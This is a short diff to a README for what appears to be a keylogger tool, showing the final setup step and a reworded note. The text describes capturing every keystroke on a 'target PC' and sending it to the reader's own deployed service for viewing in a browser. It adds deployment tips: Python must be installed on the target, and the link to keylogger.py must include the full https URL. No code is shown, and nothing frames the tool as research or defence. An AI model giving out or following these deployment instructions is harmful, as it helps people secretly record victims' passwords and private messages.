@@ -65,6 +65,8 @@
 ### Step 10: Start Capturing Keystrokes
 
 - Once executed, all keystrokes from the target PC will be sent to your deployed service and can be viewed in your browser.
+### Note
+Ensure that Python is pre-installed on the target PC before executing the script.
+Ensure that when copying the link to the **keylogger.py** file, it includes the full URL, including **"https://"**.
 
-**Note:** Ensure that Python is pre-installed on the target PC before executing the script.
 
